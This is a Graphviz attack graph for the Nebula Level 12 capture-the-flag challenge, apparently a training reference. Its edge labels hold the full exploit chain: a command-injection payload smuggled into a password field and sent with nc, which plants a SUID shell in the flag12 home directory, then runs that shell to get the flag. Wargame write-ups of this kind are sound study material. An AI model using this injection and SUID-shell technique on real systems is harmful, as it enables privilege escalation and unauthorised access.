digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 12"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Service identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Command injection confirmed"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="SUID helper created"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag12 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="netstat -lntp 2>/dev/null | grep 50001"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="telnet localhost 50001"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="printf \"Password: \"\";/bin/cp /tmp/shell /home/flag12/shell; chmod u+s /home/flag12/shell
\" | nc localhost 50001"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="/home/flag12/shell -p -c /bin/getflag"];
}
